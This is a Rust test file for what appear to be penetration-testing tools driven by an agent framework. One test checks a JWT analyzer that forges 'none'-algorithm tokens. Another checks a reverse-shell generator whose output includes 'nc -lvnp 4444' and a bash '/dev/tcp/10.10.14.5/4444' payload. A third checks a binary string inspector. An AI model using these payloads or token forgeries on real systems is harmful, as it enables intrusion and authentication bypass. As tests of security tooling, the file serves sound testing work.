use cyber_agent::{Tool, ToolCtx};
use cyber_tools::{BinaryInspectTool, JwtAnalyzerTool, ReverseShellGenTool};
use serde_json::json;
use std::path::PathBuf;

fn test_ctx() -> ToolCtx {
    ToolCtx::new(PathBuf::from("."), vec![], None, vec![])
}

#[tokio::test]
async fn test_jwt_analyzer_none_alg() {
    let tool = JwtAnalyzerTool;
    let ctx = test_ctx();

    let sample_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIifQ.dummy_sig";
    let res = tool
        .run(
            json!({
                "token": sample_jwt,
                "action": "none_alg"
            }),
            &ctx,
        )
        .await
        .unwrap();

    assert!(!res.is_error);
    let val: serde_json::Value = serde_json::from_str(&res.content).unwrap();
    assert!(val["token_with_trailing_dot"]
        .as_str()
        .unwrap()
        .ends_with('.'));
    assert_eq!(val["forged_header"]["alg"], "none");
}

#[tokio::test]
async fn test_reverse_shell_gen() {
    let tool = ReverseShellGenTool;
    let ctx = test_ctx();

    let res = tool
        .run(
            json!({
                "ip": "10.10.14.5",
                "port": 4444,
                "shell_type": "bash",
                "encode": "plain"
            }),
            &ctx,
        )
        .await
        .unwrap();

    assert!(!res.is_error);
    let val: serde_json::Value = serde_json::from_str(&res.content).unwrap();
    assert_eq!(val["listener_command"], "nc -lvnp 4444");
    assert!(val["target_payload"]
        .as_str()
        .unwrap()
        .contains("/dev/tcp/10.10.14.5/4444"));
}

#[tokio::test]
async fn test_binary_inspect_on_cargo_toml() {
    let tool = BinaryInspectTool;
    let ctx = test_ctx();

    let res = tool
        .run(
            json!({
                "file_path": "Cargo.toml",
                "extract_strings": true
            }),
            &ctx,
        )
        .await
        .unwrap();

    assert!(!res.is_error);
    let val: serde_json::Value = serde_json::from_str(&res.content).unwrap();
    assert_eq!(val["format"], "Unknown / Raw");
}
